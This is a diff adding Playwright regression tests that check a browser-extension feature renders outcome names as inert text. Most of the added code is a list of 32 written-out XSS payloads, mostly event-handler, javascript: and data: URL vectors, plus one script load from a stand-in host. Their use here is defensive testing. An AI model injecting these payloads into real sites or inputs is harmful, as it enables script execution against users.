@@ -188,4 +188,118 @@ test.describe('AttachOvToSissekanneIFeature — picker injected into Sissekanne 
     await expect.poll(() => page.locator('add-entry tahvel-input input').inputValue()).toBe('abcdef (ÕV1)')
     await expect(page.locator('input[data-ov-num="1"]')).toBeChecked()
   })
+
+  test('renders a malicious outcome name as inert text without executing it', async() => {
+    const page = await context.newPage()
+    await mockTahvel(page, JOURNAL_ROUTE)
+
+    // Override the outcomes endpoint with XSS payloads in nameEt. The feature
+    // renders these via createTextNode (safe). A regression to innerHTML would
+    // let the REAL browser fire onerror/onload and set window.__xss — which a
+    // JSDOM unit test cannot detect, but this end-to-end test can.
+    const imgXss = '<img src=x onerror="window.__xss=true">'
+    const svgXss = '<svg onload="window.__xss=true"></svg>'
+    await page.route(/journalEntriesByDate/, route => route.fulfill({
+      status: 200,
+      contentType: 'application/json',
+      body: JSON.stringify([
+        { id: 1, entryType: 'SISSEKANNE_O', outcomeOrderNr: 0, nameEt: imgXss },
+        { id: 2, entryType: 'SISSEKANNE_O', outcomeOrderNr: 1, nameEt: svgXss }
+      ])
+    }))
+
+    await page.goto(JOURNAL_URL, { waitUntil: 'domcontentloaded' })
+    await waitForFeatureReady(page)
+    await mountModal(page, 'Iseseisev töö')
+
+    const section = page.locator('.oa2-attach-ov-section')
+    await expect(section).toBeAttached({ timeout: 5000 })
+
+    // The payloads are rendered as literal text, not parsed as HTML.
+    await expect(section).toContainText('<img src=x onerror=')
+    await expect(section).toContainText('<svg onload=')
+
+    // No dangerous element was parsed into the DOM.
+    expect(await section.locator('img, svg, script').count()).toBe(0)
+
+    // Nothing executed in the real browser. img.onerror fires asynchronously
+    // after the failed load, so give it a tick before asserting non-execution.
+    await page.waitForTimeout(300)
+    expect(await page.evaluate(() => window.__xss)).toBeUndefined()
+  })
+
+  // Real-browser equivalent of the DomService 32-vector matrix: drive every
+  // documented XSS vector through a live render path (outcome nameEt →
+  // createTextNode) and assert none parses into a dangerous element and none
+  // executes. A regression to innerHTML makes auto-firing vectors (img.onerror,
+  // svg/body onload, autofocus onfocus, details ontoggle, etc.) set window.__xss.
+  test('neutralizes all known XSS vectors rendered through outcome names', async() => {
+    const vectors = [
+      '<script>window.__xss=true</script>',
+      '<script src="https://evil.test/x.js"></script>',
+      '<img src=x onerror="window.__xss=true">',
+      '<svg onload="window.__xss=true"></svg>',
+      '<body onload="window.__xss=true">',
+      '<video><source src=x onerror="window.__xss=true"></video>',
+      '<audio src=x onerror="window.__xss=true">',
+      '<input onfocus="window.__xss=true" autofocus>',
+      '<select onfocus="window.__xss=true" autofocus></select>',
+      '<textarea onfocus="window.__xss=true" autofocus></textarea>',
+      '<details open ontoggle="window.__xss=true"></details>',
+      '<marquee onstart="window.__xss=true"></marquee>',
+      '<object data=x onerror="window.__xss=true"></object>',
+      '<embed src=x onerror="window.__xss=true">',
+      '<iframe onload="window.__xss=true"></iframe>',
+      '<a href="javascript:window.__xss=true">x</a>',
+      '<iframe src="javascript:window.__xss=true"></iframe>',
+      '<form action="javascript:window.__xss=true"><input type=submit></form>',
+      '<button formaction="javascript:window.__xss=true">x</button>',
+      '<object data="javascript:window.__xss=true"></object>',
+      '<iframe src="data:text/html,<script>window.__xss=true</script>"></iframe>',
+      '<object data="data:text/html,<script>window.__xss=true</script>"></object>',
+      '<svg><script>window.__xss=true</script></svg>',
+      '<svg><animate onbegin="window.__xss=true" attributeName=x dur=1s></svg>',
+      '<meta http-equiv="refresh" content="0;url=javascript:window.__xss=true">',
+      '<base href="javascript://">',
+      '<div style="background:url(javascript:window.__xss=true)">x</div>',
+      '<ScRiPt>window.__xss=true</ScRiPt>',
+      '<img src=x onerror=&#119;&#105;&#110;&#100;&#111;&#119;.__xss=true>',
+      '<scr\x00ipt>window.__xss=true</script>',
+      '<img\tsrc=x\nonerror="window.__xss=true">',
+      '<div><script>window.__xss=true</script></div>'
+    ]
+
+    const page = await context.newPage()
+    await mockTahvel(page, JOURNAL_ROUTE)
+    await page.route(/journalEntriesByDate/, route => route.fulfill({
+      status: 200,
+      contentType: 'application/json',
+      body: JSON.stringify(vectors.map((nameEt, i) => ({
+        id: i + 1, entryType: 'SISSEKANNE_O', outcomeOrderNr: i, nameEt
+      })))
+    }))
+
+    await page.goto(JOURNAL_URL, { waitUntil: 'domcontentloaded' })
+    await waitForFeatureReady(page)
+    await mountModal(page, 'Iseseisev töö')
+
+    const section = page.locator('.oa2-attach-ov-section')
+    await expect(section).toBeAttached({ timeout: 5000 })
+    // All 32 outcome rows rendered (one checkbox per vector).
+    await expect.poll(() => section.locator('input[type="checkbox"]').count()).toBe(vectors.length)
+
+    // Not one vector parsed into a dangerous element. (input/label are legit
+    // parts of each row, so they're excluded; the autofocus-onfocus vectors are
+    // caught by the window.__xss execution check instead.)
+    expect(await section.locator(
+      'script, img, svg, iframe, object, embed, audio, video, marquee, details, form, meta, base, a[href]'
+    ).count()).toBe(0)
+
+    // A representative payload is rendered as literal text.
+    await expect(section).toContainText('<script>window.__xss=true</script>')
+
+    // Nothing executed in the real browser across any vector.
+    await page.waitForTimeout(400)
+    expect(await page.evaluate(() => window.__xss)).toBeUndefined()
+  })
 })
